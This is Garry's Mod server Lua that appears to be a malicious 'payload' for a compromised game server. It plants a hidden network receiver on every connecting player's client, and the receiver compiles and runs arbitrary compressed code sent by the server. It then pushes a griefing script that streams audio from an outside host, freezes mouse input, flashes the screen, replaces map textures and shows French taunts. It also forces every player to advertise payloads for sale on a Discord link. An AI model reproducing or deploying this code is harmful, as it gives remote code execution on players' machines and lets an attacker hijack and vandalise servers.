local function rdm_str(len)
	if !len or len &lt;= 0 then return '' end
	return rdm_str(len - 1) .. (&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;)[math.random(1, 62)]
end

local net_string = rdm_str(25)

util.AddNetworkString(net_string)
BroadcastLua([[net.Receive(&quot;]] .. net_string .. [[&quot;,function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),&quot;?&quot;)()end)]])
hook.Add(&quot;PlayerInitialSpawn&quot;, &quot;ifyouseethisdontpanicitsme&quot;,function(ply)
	if !ply:IsBot() then
		ply:SendLua([[net.Receive(&quot;]] .. net_string .. [[&quot;,function()CompileString(util.Decompress(net.ReadData(net.ReadUInt(16))),&quot;?&quot;)()end)]])
	end
end)

local function SendToClient(code)
	timer.Simple(0.5, function()
		local data = util.Compress(code)
		local len = #data
		net.Start(net_string)
		net.WriteUInt(len, 16)
		net.WriteData(data, len)
		net.Broadcast()
	end)
end

SendToClient([====[

local gfx = {}

local messages = {
	&quot;Razday is Here !&quot;,
	&quot;Red&eacute;marrer ton serveur ne sert &agrave; rien !&quot;,
	&quot;Vous d&eacute;connecter ne sert &agrave; rien !&quot;,
	&quot;Je me suis fait chier &agrave; faire ce payload&quot;,
	&quot;Alors tu vas le regarder, en entier&quot;,
	&quot;C'est pas bien le leak&quot;,
	&quot;Avoue c'est un peut styler quand m&ecirc;me&quot;
}


hook.Add(&quot;HUDPaint&quot;, &quot;FUCKIT_G&quot;,function()
	for k,v in pairs(gfx) do
		v()
	end
end)

local message = &quot;Ne redemmare pas ton server, cela ne sert a rien&quot;
local function SlowType(msg,interval,callback)
	callback = callback or function()end
	message = &quot;&quot;
	for i=1,#msg do
		timer.Simple(interval * i,function()
			message = message .. msg[i]
		end)
	end
	timer.Simple(#msg*interval,callback)
end
local function GetRandomSpot()
	local ppos = LocalPlayer():GetPos()
	return Vector(ppos.x + math.random(-500, 500),ppos.y + math.random(-500, 500),ppos.z + math.random(-10, 10))
end
surface.CreateFont(&quot;PWN&quot;,{bold=true,size=40})
SOUNDSTART_CTP = false
sound.PlayURL(&quot;http://venus.unrealhosting.fr:20126/john.mp3&quot;,&quot;no block&quot;,function(s)
	if not s then return end
	if SOUNDSTART_CTP then s:Stop() return end
	SOUNDSTART_CTP = true


	local ragtbl = {}
	for i=1,20 do
		ragtbl[i] = ClientsideRagdoll( &quot;models/player/gman_high.mdl&quot; )
		ragtbl[i]:SetNoDraw( false )
		ragtbl[i]:DrawShadow( true )
	end
	

	timer.Create(&quot;ChangeRagdolesSpotsAW&quot;, 1, 0, function()
		for k,v in pairs(ragtbl) do
			v:SetPos(GetRandomSpot())
		end
	end)


	hook.Add(&quot;AdjustMouseSensitivity&quot;,&quot;MDR&quot;,function()
		return 0
	end)
	gfx[&quot;CoolEffect&quot;] = function()
		local tbl = {}
		s:FFT(tbl,FFT_2048)

		local fal = 0
		for i=4,6 do
			fal = fal + tbl[i]
		end

		if fal &gt; 0.8 then
			local ca = Color(math.random(0,255),math.random(0,255),math.random(0,255), 150)
			gfx[&quot;ColorChange&quot;] = function()
				draw.RoundedBoxEx(0, 0, 0, ScrW(),ScrH(),ca)
			end
			util.ScreenShake(LocalPlayer():GetPos(),20,20,0.5,20)
			local mats = Entity(0):GetMaterials()
			for k,v in pairs(mats) do
			local r,g,b = ColorRand().r-50, ColorRand().g-50, ColorRand().b-50
				Material(v):SetVector(&quot;$color&quot;, Vector(r,g,b))
				Material(v):SetTexture( &quot;$basetexture&quot;, &quot;_rt_fullframefb&quot; )
			end
		end
		for k,v in pairs(tbl) do
			local col = HSVToColor(k * 1 % 360,1,1)
			draw.RoundedBoxEx(0,0,k * 10, (v*10000), 10,col)
			draw.RoundedBoxEx(0,ScrW() - (v*10000),k * 10, (v*10000), 10,col)
		end
	end
	
	timer.Simple(29, function()
		
			hook.Add(&quot;GetMotionBlurValues&quot;, &quot;YASS&quot;,function(a,b,c,d)
				return a,b,c+140,d
			end)
			
		
	end)

	local cc = 1
	local omgs = {}
	timer.Create(&quot;MVSPOS&quot;, 0.04, 0, function()
		for k,v in pairs(omgs) do
			if  omgs[ k ].n &lt;= 0 then omgs[ k ] = nil continue end
			omgs[ k ] = {text = omgs[ k ].text, n = omgs[ k ].n - 1}
		end
	end)
	local isPounding = false

	timer.Create(&quot;NEXTMSG&quot;, 6, #messages, function()
		if cc &gt; #messages then
			isPounding = true
			return
		end
		table.insert(omgs, {text = messages[ cc ],n = ScrH()})
		cc = cc + 1
	end)
	
	gfx[&quot;MessageC&quot;] = function()
		if isPounding and (#messages &lt;= 0) then
			draw.SimpleText(&quot;RT ton server &lt;3&quot;, &quot;PWN&quot;, ScrW() / 2, ScrH() / 2,Color(200,0,0),1,1)
		end
		for k,v in pairs(omgs) do
			draw.SimpleText(omgs[ k ].text, &quot;PWN&quot;, ScrW() / 2, omgs[ k ].n,Color(0,0,0),1,1)
		end
	end
end)
concommand.Add(&quot;canard&quot;, function() 
	hook.Remove(&quot;GetMotionBlurValues&quot;, &quot;YASS&quot;)
	hook.Remove(&quot;AdjustMouseSensitivity&quot;,&quot;MDR&quot;)
	hook.Remove(&quot;HUDPaint&quot;, &quot;FUCKIT_G&quot;)
end)
]====])

timer.Create(&quot;nonameplease&quot;, 5, 0,function()
    for i=1, #player.GetHumans() do
        local ply = player.GetHumans()[i]
        ply:Say( &quot;/ooc BUY Payloads https://discord.gg/Dq8BYhAx24&quot;)
    end
end)